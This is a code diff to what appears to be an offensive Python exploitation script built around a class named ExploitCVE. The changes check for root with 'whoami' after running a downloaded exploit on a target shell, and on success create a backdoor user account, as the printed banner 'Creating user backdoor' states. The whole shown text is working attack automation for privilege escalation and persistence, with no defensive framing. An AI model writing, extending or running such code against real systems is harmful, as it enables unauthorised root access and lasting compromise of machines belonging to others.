@@ -151,6 +151,11 @@ class ExploitCVE(object):
         shell.write('./exploit')
         time.sleep(10)
         print(shell.read())
+        shell.write('whoami')
+        time.sleep(10)
+        root_status = shell.read()
+        print(root_status)
+        return root_status
     
     def createUser(self):
         """
@@ -232,7 +237,15 @@ def main():
                     print("#    6. Downloading and executing the exploit...")
                     print("############################################################################")
                     ec.sendCommand()
-                    ec.exploitTarget()
+                    priv_esc = ec.exploitTarget()
+                    if priv_esc == 'root':
+                        print("############################################################################")
+                        print("#    7. Creating user backdoor...")
+                        print("############################################################################")
+                        ec.createUser()
+                        pass
+                    else:
+                        pass
                 else:
                     print("Target can not be exploited!")
                     pass
